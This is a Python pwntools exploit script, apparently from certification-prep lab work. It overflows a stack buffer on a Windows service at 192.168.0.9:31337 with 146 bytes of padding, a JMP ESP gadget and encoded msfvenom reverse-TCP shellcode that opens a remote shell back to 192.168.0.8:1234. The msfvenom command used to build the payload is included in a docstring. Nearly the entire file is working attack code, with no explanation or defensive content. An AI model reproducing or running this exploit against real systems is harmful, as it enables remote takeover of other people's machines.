#!/usr/bin/env python3
from pwn import *
r = remote('192.168.0.9',31337)

#make reverse shellcode
"""
pat@kali:~/Desktop/Cert_Prep/doBOG/python_scripts$ msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.8 LPORT=1234 -f python -e x86/shikata_ga_nai -b "\x00\x0A" EXITFUNC=thread
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 389 (iteration=0)
x86/shikata_ga_nai chosen with final size 389
Payload size: 389 bytes
Final size of python file: 1897 bytes
"""
jmp_esp_gadget = struct.pack("<I",0x080414c3)

buf =  b"\x90\x90\x90\x90\x90\x90\x90\x90"
buf += b"\xb8\x03\xe4\x94\xe1\xda\xc1\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x5b\x31\x43\x14\x03\x43\x14\x83\xc3\x04\xe1"
buf += b"\x11\x68\x09\x67\xd9\x91\xca\x07\x53\x74\xfb\x07\x07"
buf += b"\xfc\xac\xb7\x43\x50\x41\x3c\x01\x41\xd2\x30\x8e\x66"
buf += b"\x53\xfe\xe8\x49\x64\x52\xc8\xc8\xe6\xa8\x1d\x2b\xd6"
buf += b"\x63\x50\x2a\x1f\x99\x99\x7e\xc8\xd6\x0c\x6f\x7d\xa2"
buf += b"\x8c\x04\xcd\x23\x95\xf9\x86\x42\xb4\xaf\x9d\x1d\x16"
buf += b"\x51\x71\x16\x1f\x49\x96\x12\xe9\xe2\x6c\xe9\xe8\x22"
buf += b"\xbd\x12\x46\x0b\x71\xe1\x96\x4b\xb6\x19\xed\xa5\xc4"
buf += b"\xa4\xf6\x71\xb6\x72\x72\x62\x10\xf1\x24\x4e\xa0\xd6"
buf += b"\xb3\x05\xae\x93\xb0\x42\xb3\x22\x14\xf9\xcf\xaf\x9b"
buf += b"\x2e\x46\xeb\xbf\xea\x02\xa8\xde\xab\xee\x1f\xde\xac"
buf += b"\x50\xc0\x7a\xa6\x7d\x15\xf7\xe5\xe9\xda\x3a\x16\xea"
buf += b"\x74\x4c\x65\xd8\xdb\xe6\xe1\x50\x94\x20\xf5\xe1\xb2"
buf += b"\xd2\x29\x49\xd2\x2c\xca\xaa\xfb\xea\x9e\xfa\x93\xdb"
buf += b"\x9e\x90\x63\xe3\x4a\x0c\x69\x73\xb5\x79\x6d\x8b\x5d"
buf += b"\x78\x6d\x8f\x4f\xf5\x8b\xdf\x3f\x56\x03\xa0\xef\x16"
buf += b"\xf3\x48\xfa\x98\x2c\x68\x05\x73\x45\x03\xea\x2a\x3e"
buf += b"\xbc\x93\x76\xb4\x5d\x5b\xad\xb1\x5e\xd7\x44\x46\x10"
buf += b"\x10\x2c\x54\x45\x47\xce\xa4\x96\xe2\xce\xce\x92\xa4"
buf += b"\x99\x66\x99\x91\xee\x29\x62\xf4\x6c\x2d\x9c\x89\x44"
buf += b"\x46\xab\x1f\xe9\x30\xd4\xcf\xe9\xc0\x82\x85\xe9\xa8"
buf += b"\x72\xfe\xb9\xcd\x7c\x2b\xae\x5e\xe9\xd4\x87\x33\xba"
buf += b"\xbc\x25\x6a\x8c\x62\xd5\x59\x8e\x65\x29\x1c\xb9\xcd"
buf += b"\x42\xde\xf9\xed\x92\xb4\xf9\xbd\xfa\x43\xd5\x32\xcb"
buf += b"\xac\xfc\x1a\x43\x27\x91\xe9\xf2\x38\xb8\xac\xaa\x39"
buf += b"\x4f\x75\x5c\x40\x20\x8a\x9d\xb5\x28\xef\x9d\xb6\x54"
buf += b"\x11\xa1\x61\x6d\x67\xe4\xb2\xca\x68\xfb\x1e\x27\x01"
buf += b"\xa2\xcb\x8a\x4c\x55\x26\xc8\x68\xd6\xc2\xb1\x8e\xc6"
buf += b"\xa7\xb4\xcb\x40\x54\xc5\x44\x25\x5a\x7a\x64\x6c"

shellcode = buf

buf = b""
buf+= b"A"*146
buf+= jmp_esp_gadget
buf+=shellcode
buf+= b"\n"
r.send(buf)
resp = r.recv()
print(str(resp))

